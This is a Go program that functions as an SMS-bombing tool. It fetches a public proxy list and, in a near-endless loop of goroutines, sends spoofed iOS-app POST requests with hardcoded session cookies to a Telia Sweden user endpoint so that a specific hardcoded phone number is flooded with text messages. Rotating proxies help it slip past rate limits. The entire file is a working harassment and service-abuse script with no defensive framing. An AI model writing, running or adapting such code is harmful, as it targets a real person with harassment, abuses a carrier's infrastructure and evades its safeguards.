package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

var proxyList = fetchProxies("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")

func main() {

	// Ensure there are proxies available
	if len(proxyList) == 0 {
		fmt.Println("No proxies available.")
		return
	}

	// Start flooding requests
	for i := 0; i < 46706505038; i++ {
		go floodSMS()
		time.Sleep(time.Millisecond * 1)
	}
}
func fetchProxies(uri string) []string {
	resp, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

// Function to check the status of a website through a proxy

// Function to flood SMS requests using proxies
func floodSMS() {
	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
	proxy := proxyList[rand.Intn(len(proxyList))]

	data := `{"identifier": "46706505038"}` // Fixed the JSON formatting issue

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	client := &fasthttp.Client{
		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
	}

	if err := client.Do(req, resp); err != nil {
		fmt.Println("[-] Failed to send message, invalid proxy")
		return
	} else {
		fmt.Printf("[+] Sent a message to 0706505038 with proxy %s\n", proxy)

	}

	fmt.Println(string(resp.Body()))
}
